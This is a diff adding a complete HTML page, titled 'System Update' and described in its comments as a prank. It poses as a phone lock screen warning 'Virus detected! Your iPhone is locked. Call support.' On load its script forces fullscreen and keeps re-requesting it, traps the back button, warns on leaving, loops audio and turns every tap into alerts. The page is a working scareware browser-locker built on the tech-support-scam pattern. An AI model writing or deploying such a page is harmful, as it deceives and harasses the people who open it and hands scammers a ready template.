@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>System Update</title>
+    <style>
+        /* Full‑screen overlay that hides the real UI */
+        #trap {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: black;
+            color: red;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            font-family: -apple-system, sans-serif;
+            font-size: 1.8em;
+            text-align: center;
+            cursor: default;
+            user-select: none;
+            -webkit-user-select: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- The scary “virus” message -->
+    <div id="trap">⚠️ Virus detected!<br>Your iPhone is locked.<br>Call support: 1‑800‑MOO</div>
+
+    <!-- Audio element set to loop -->
+    <audio id="moo" loop>
+        <source src="moo.mp3" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
+
+    <script>
+        const audio = document.getElementById('moo');
+        const trap = document.getElementById('trap');
+
+        // --- Prank logic ---
+        function startPrank() {
+            // 1. Play the moo sound (the initial tap on the link counts as user interaction)
+            audio.play().catch(e => console.log('Audio play failed:', e));
+
+            // 2. Go full screen – hides address bar and makes it look like a system screen
+            const requestFS = document.documentElement.requestFullscreen ||
+                              document.documentElement.webkitRequestFullscreen;
+            if (requestFS) {
+                requestFS.call(document.documentElement).catch(e => {});
+            }
+
+            // 3. Trap the back button – push an extra history entry then lock it
+            history.pushState(null, null, location.href);
+            window.onpopstate = function() {
+                history.pushState(null, null, location.href);
+            };
+
+            // 4. Discourage leaving with a warning pop‑up (doesn’t fully block, but adds friction)
+            window.onbeforeunload = function() {
+                return "Moo! Are you sure you want to leave?";
+            };
+
+            // 5. Keep sound and fullscreen active if the user somehow exits them
+            setInterval(() => {
+                if (audio.paused) audio.play();
+                if (!document.fullscreenElement && requestFS) {
+                    requestFS.call(document.documentElement).catch(e => {});
+                }
+            }, 500);
+
+            // 6. Overlay eats all touches – tapping just shows a “Moo” alert
+            trap.addEventListener('click', function(e) {
+                e.preventDefault();
+                alert('Moooo! Your phone is infected!');
+            });
+            trap.addEventListener('touchstart', function(e) {
+                e.preventDefault();
+                alert('Moooo!');
+            });
+        }
+
+        // Start immediately when the page loads (the link click already counted as interaction)
+        window.addEventListener('load', startPrank);
+        // Fallback if DOMContentLoaded already fired
+        if (document.readyState === 'complete') startPrank();
+    </script>
+</body>
+</html>
